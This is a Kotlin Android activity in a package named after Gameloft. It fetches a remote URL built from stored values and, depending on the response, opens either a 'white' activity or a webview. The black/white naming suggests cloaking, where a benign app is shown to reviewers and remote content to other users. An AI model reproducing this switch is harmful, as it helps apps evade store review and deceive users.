package com.gameloft.android.ANMP.GloftDMH.black

import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import com.gameloft.android.ANMP.GloftDMH.R
import com.gameloft.android.ANMP.GloftDMH.white.WhiteOne
import com.gameloft.android.ANMP.GloftDMH.black.utils.CNST
import com.orhanobut.hawk.Hawk
import dagger.hilt.android.AndroidEntryPoint
import io.sentry.Sentry
import kotlinx.android.synthetic.main.activity_filter.*
import kotlinx.coroutines.*
import java.net.HttpURLConnection
import java.net.URL

@AndroidEntryPoint
class Filter : AppCompatActivity() {
    lateinit var jsoup: String

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_filter)

        jsoup = ""

        val job = GlobalScope.launch(Dispatchers.IO) {
            jsoup = coroutineTask()
            Log.d("jsoup status from global scope", jsoup)
        }

        runBlocking {
            try {
                job.join()
                Log.d("jsoup status out of global scope", jsoup)
                txtMain.text = jsoup

                if (jsoup == CNST.jsoupCheck) {
                    Intent(applicationContext, WhiteOne::class.java).also { startActivity(it) }
                } else {
                    Intent(applicationContext, Webby::class.java).also { startActivity(it) }
                }
                finish()
            } catch (e: Exception) {
                Sentry.captureException(e)
                Sentry.captureMessage("RunBlocking coroutine null pointer")
            }
        }

    }

    private suspend fun coroutineTask(): String {
        val hawk: String? = Hawk.get(CNST.C1, "null")
        val hawkAppLink: String? = Hawk.get(CNST.D1, "null")

        val forJsoupSetNaming: String = CNST.lru + CNST.odone + hawk
        val forJsoupSetAppLnk: String = CNST.lru + CNST.odone + hawkAppLink

        withContext(Dispatchers.IO) {
            if (hawk != null) {
                getCodeFromUrl(forJsoupSetNaming)
            } else {
                getCodeFromUrl(forJsoupSetAppLnk)
            }
        }
        return jsoup
    }

    private fun getCodeFromUrl(link: String) {
        val url = URL(link)
        val urlConnection = url.openConnection() as HttpURLConnection

        try {
            val text = urlConnection.inputStream.bufferedReader().readText()
            if (text.isNotEmpty()) {
                Log.d("jsoup status inside Url function", text)
                jsoup = text
            } else {
                Log.d("jsoup status inside Url function", "is null")
            }
        } catch (ex: Exception) {
            urlConnection.disconnect()
            Sentry.captureException(ex)
            Sentry.captureMessage("NullPointer in getCodeFromUrl")
        } finally {
            urlConnection.disconnect()
        }
    }

}